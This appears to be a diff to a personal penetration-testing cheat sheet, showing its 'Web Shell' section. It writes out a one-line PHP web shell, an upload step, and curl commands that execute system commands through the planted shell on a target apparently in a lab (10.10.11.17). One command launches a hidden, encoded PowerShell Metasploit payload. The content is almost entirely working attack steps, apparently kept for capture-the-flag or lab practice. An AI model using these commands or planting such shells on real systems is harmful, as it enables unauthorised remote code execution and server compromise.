@@ -232,10 +232,16 @@ gg ''
 
 ## Web
 [*] Web Shell
-+---------- Initial Shell ----------+
-echo -n '<?=`$_GET[cmd]`?>' | tee 0.php
-Upload 0.php
-curl -G 'http://$TARGET/0.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
++---------- Create Shell ----------+
+echo -n '<?=`$_GET[cmd]`?>' | tee x.php
+
++---------- Upload Shell ----------+
+Upload x.php
+
++---------- Execute Shell ----------+
+curl -G --path-as-is 'http://10.10.11.17/data/modules/x/x.php' --data-urlencode 'cmd=whoami /priv'
+curl -G --path-as-is 'http://10.10.11.17/data/modules/x/x.php' --data-urlencode 'cmd=id'
+curl -G --path-as-is 'http://$TARGET/0.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
 
 +---------- Variations ----------+
 PHP
